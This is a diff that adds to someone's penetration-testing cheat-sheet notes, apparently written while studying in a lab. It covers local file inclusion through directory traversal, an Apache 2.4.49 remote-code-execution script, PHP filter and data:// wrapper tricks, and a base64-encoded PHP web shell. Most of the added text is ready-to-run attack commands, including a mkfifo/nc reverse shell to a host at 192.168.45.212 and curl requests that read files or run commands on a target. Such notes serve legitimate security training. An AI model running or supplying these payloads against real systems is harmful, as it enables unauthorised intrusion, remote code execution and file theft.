@@ -92,6 +92,39 @@ GET /meteor/index.php?page=../../../../../../../xampp/apache/logs/access.log&cmd
 GET /meteor/index.php?page=../../../../../../opt/admin.bak.php
 
 ```
+### apache 2.4.49 RCE
+```
+/50383.sh targets.txt /bin/sh "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.212 8080 >/tmp/f"
+```
+
+
+# PHP Wrappers
+no encoding
+```
+curl http://192.168.187.16/meteor/index.php?page=php://filter/resource=/var/www/html/backup.php
+```
+Encoding
+```
+curl http://192.168.187.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php
+```
+Command
+```
+curl "http://192.168.187.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+
+```
+encode our command
+```
+echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
+
+curl "http://192.168.187.16/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a%0A"
+```
+
+# RFI 
+
+# File Upload
+
+# Command Injection
 
 
 # Checklist
